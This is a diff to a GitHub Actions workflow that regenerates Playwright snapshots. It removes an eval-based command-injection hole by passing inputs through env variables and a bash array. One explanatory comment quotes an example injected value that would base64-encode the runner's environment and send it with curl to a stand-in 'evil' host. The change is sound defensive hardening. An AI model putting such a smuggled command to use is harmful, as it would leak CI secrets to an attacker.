@@ -106,14 +106,30 @@ jobs:
         # spec failure on DEV doesn't abort the workflow — the commit
         # step inspects `git status` and only commits PNGs that
         # actually changed, so partial regens are safe.
+        env:
+          # Pass user-controllable inputs via env, NOT via `${{ … }}`
+          # template interpolation into the shell script body. Template
+          # interpolation substitutes the literal input string into the
+          # generated bash, which combined with `eval` is a textbook
+          # CWE-78 command-injection sink (a `spec_glob` like
+          # `foo.spec.ts; curl evil/$(env|base64) #` would run on the
+          # runner). Reading via `$SPEC_GLOB` / `$TOLERATE` keeps the
+          # data inside the shell's variable expansion, not the parser.
+          SPEC_GLOB: ${{ inputs.spec_glob }}
+          TOLERATE: ${{ inputs.tolerate_failures }}
         run: |
           set -euo pipefail
-          CMD="npx playwright test --project=chromium --update-snapshots=all --grep-invert \"Accessibility\" ${{ inputs.spec_glob }}"
-          if [[ "${{ inputs.tolerate_failures }}" == "true" ]]; then
+          # $SPEC_GLOB is intentionally unquoted so the shell expands
+          # the multi-spec glob (`e2e/0*.spec.ts e2e/1*.spec.ts`) into
+          # separate arguments. Shell-metachars inside it are still
+          # word-split — they are NOT parsed as a new command, since
+          # there is no `eval`.
+          CMD=(npx playwright test --project=chromium --update-snapshots=all --grep-invert "Accessibility")
+          if [[ "$TOLERATE" == "true" ]]; then
             echo "[regen] tolerate_failures=true — appending '|| true'"
-            eval "$CMD || true"
+            "${CMD[@]}" $SPEC_GLOB || true
           else
-            eval "$CMD"
+            "${CMD[@]}" $SPEC_GLOB
           fi
 
       - name: Commit, push to a side branch, open auto-merge PR
